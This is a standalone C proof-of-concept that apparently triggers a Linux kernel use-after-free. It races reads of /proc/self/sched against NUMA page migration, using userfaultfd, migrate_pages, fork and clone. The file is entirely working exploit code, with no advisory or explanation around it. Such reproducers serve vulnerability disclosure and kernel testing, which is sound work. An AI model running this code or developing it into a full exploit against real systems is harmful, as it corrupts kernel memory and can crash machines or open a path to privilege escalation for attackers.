#define _GNU_SOURCE
#include <errno.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <stdio.h>
#include <numaif.h>
#include <sched.h>
#include <err.h>
#include <time.h>
#include <fcntl.h>
#include <signal.h>
#include <sys/prctl.h>
#include <sys/mman.h>
#include <sys/wait.h>
#include <sys/ioctl.h>
#include <sys/uio.h>
#include <sys/syscall.h>
#include <linux/userfaultfd.h>

int sched_fd;

int get_scan_seq(void) {
  char buf[0x1000];
  ssize_t buflen = pread(sched_fd, buf, sizeof(buf)-1, 0);
  if (buflen == -1) return -1;
  buf[buflen] = '\0';
  char *p = strstr(buf, "numa_scan_seq");
  if (!p) return -1;
  *strchrnul(p, '\n') = '\0';
  p = strpbrk(p, "0123456789");
  if (!p) return -1;
  return atoi(p);
}

void reexec(char *arg0) {
  char *argv[] = {arg0, NULL};
  execvp("/proc/self/exe", argv);
  return;
}

volatile int uaf_child_ready = 0;
static int sfd_uaf(void *fd_) {
  int fd = (int)(long)fd_;
/*
  prctl(PR_SET_PDEATHSIG, SIGKILL);
  if (getppid() == 1) raise(SIGKILL);
*/

  while (1) {
    char buf[0x1000];
    ssize_t res = pread(fd, buf, sizeof(buf)-1, 0);
    if (res == -1) {
      if (errno == ESRCH) _exit(0);
      return -1;
    }
    buf[res] = '\0';
    puts(buf);
    uaf_child_ready = 1;
  }
}

int main(int argc, char **argv) {
  if (strcmp(argv[0], "die") == 0) {
    _exit(0);
  }
  sched_fd = open("/proc/self/sched", O_RDONLY|O_CLOEXEC);
  if (sched_fd == -1) return -1;

  // allocate two pages at the lowest possible virtual address so that the first periodic memory fault is scheduled on the first page
  char *page = mmap((void*)0x1000, 0x2000, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS|MAP_FIXED, -1, 0);
  if (page == MAP_FAILED) return -1;
  *page = 'a';

  // handle the second page with uffd
  int ufd = syscall(__NR_userfaultfd, 0);
  if (ufd == -1) return -1;
  struct uffdio_api api = { .api = UFFD_API, .features = 0 };
  if (ioctl(ufd, UFFDIO_API, &api)) return -1;
  struct uffdio_register reg = {
    .mode = UFFDIO_REGISTER_MODE_MISSING,
    .range = { .start = (__u64)page+0x1000, .len = 0x1000 }
  };
  if (ioctl(ufd, UFFDIO_REGISTER, &reg))
    return -1;

  // make sure that the page is on the CPU-less NUMA node
  unsigned long old_nodes = 0x1;
  unsigned long new_nodes = 0x2;
  if (migrate_pages(0, sizeof(unsigned long), &old_nodes, &new_nodes)) return -1;

  // trigger userfault in child
  pid_t uffd_child = fork();
  if (uffd_child == -1) return -1;
  if (uffd_child == 0) {
    prctl(PR_SET_PDEATHSIG, SIGKILL);
    struct iovec iov = { .iov_base = (void*)0x1fff, .iov_len = 2 };
    process_vm_readv(getppid(), &iov, 1, &iov, 1, 0);
    return -1;
  }
  sleep(1);

  int ini_seq = get_scan_seq();
  // printf("initial scan_seq: %d\n", ini_seq);
  if (ini_seq) reexec("m");

  // wait for a migration
  time_t start_time = time(NULL);
  while (1) {
    if (time(NULL) > start_time + 30) {
      // puts("no migration detected!");
      reexec("m");
    }
    int cur_seq = get_scan_seq();
    if (cur_seq != 0) {
      // printf("new scan_seq: %d\n", cur_seq);
      goto migration_done;
    }
  }

migration_done:
  // printf("migration done after %d seconds\n", (int)(time(NULL)-start_time));
  while (1) {
    pid_t pid = fork();
    if (pid == -1) return -1;
    if (pid == 0) {
      static char uaf_stack[1024*1024];
      static char uaf_stack2[1024*1024];
      int sfd = open("/proc/self/sched", O_RDONLY);
      if (sfd == -1) return -1;
      pid_t uaf_child = clone(sfd_uaf, uaf_stack+sizeof(uaf_stack), CLONE_FILES|CLONE_VM, (void*)(long)sfd);
      if (uaf_child == -1) return -1;
      uaf_child = clone(sfd_uaf, uaf_stack2+sizeof(uaf_stack2), CLONE_FILES|CLONE_VM, (void*)(long)sfd);
      if (uaf_child == -1) return -1;
      while (!uaf_child_ready) __builtin_ia32_pause();
      *(volatile char *)page = 'b';
      reexec("die");
    }
    int status;
    if (wait(&status) != pid) return -1;
  }
}
